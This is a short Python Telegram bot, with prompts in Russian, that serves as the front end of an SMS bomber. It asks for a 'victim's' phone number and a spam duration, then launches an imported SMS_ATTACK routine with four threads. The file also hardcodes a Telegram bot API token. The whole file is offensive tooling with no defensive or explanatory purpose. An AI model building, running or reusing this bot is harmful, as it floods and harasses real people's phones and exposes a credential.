import telebot

bot = telebot.TeleBot('1505426882:AAHJN1OY8Zdd1Bzl_6W_8JHK_16JZs1hUBM')


@bot.message_handler(commands=['help'])
def start(message):
    help = 'Для начала атаки напиши /bomber'
    bot.send_message(message.chat.id, help)


number = ''
time = 0
@bot.message_handler(content_types=['text'])
def start(message):
    if message.text == '/bomber':
        bot.send_message(message.from_user.id, 'Введи номер жертвы (с кодом страны):')
        bot.register_next_step_handler(message, get_number)
    else:
        bot.send_message(message.from_user.id, 'Напиши /bomber или /help')


def get_number(message):
    global number
    number = message.text
    bot.send_message(message.from_user.id, 'Введите время спама в секундах:')
    bot.register_next_step_handler(message, get_time)


def get_time(message):
    global time
    time = message.text
    time_integer = int(time)
    time = time_integer
    main()


def main():
    threads = 4
    from SMS.main import SMS_ATTACK
    SMS_ATTACK(threads, time, number)


bot.polling()
